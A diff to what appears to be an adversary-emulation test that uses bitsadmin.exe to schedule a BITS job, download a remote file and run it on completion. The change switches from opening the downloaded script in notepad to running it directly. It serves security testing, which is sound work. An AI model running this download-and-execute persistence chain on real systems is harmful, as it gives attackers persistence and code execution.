@@ -45,7 +45,7 @@ atomic_tests:
 
 - name: Persist, Download, & Execute
   description: |
-    This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer 
+    This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
     and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
   supported_platforms:
     - windows
@@ -69,11 +69,12 @@ atomic_tests:
     command_line:
       description: Command line to execute
       type: string
-      default: notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1
+      default: C:\Windows\Temp\bitsadmin_flag.ps1
   executor:
     name: command_prompt
     command: |
       bitsadmin.exe /create #{bits_job_name}
       bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
       bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
+      bitsadmin.exe /complete AtomicBITS
       bitsadmin.exe /resume #{bits_job_name}
